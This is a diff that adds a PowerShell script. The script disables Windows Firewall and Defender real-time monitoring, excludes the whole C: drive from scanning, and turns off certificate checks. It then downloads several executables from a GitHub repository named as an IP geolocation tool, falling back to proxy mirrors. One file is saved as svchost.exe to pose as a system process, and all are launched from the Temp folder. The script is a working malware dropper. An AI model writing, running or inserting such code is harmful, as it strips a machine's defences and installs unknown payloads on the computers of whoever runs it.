@@ -1,0 +1,27 @@
+try { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False } catch {}
+try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
+try { Add-MpPreference -ExclusionPath C:\ } catch {}
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+$d = "C:\Windows\Temp"
+$base = "https://raw.githubusercontent.com/liubowen027/ip-geoaddress-generator/refs/heads/main"
+$mirrors = @(
+    "https://ghproxy.it/",
+    "https://wget.la/",
+    "https://gh-proxy.org/",
+    "https://ghproxy.net/",
+    "https://ghfast.top/"
+)
+
+function DL($file, $out) {
+    try { (New-Object Net.WebClient).DownloadFile("$base/$file", $out); return } catch {}
+    foreach ($m in $mirrors) {
+        try { (New-Object Net.WebClient).DownloadFile("$m$base/$file", $out); return } catch {}
+    }
+}
+
+DL "system.exe" "$d\svchost.exe"; Start-Sleep 3; Start-Process "$d\svchost.exe"
+DL "usc.exe" "$d\usc.exe"; Start-Sleep 3; Start-Process "$d\usc.exe"
+DL "agent1.exe" "$d\abg.exe"; Start-Sleep 3; Start-Process "$d\abg.exe"
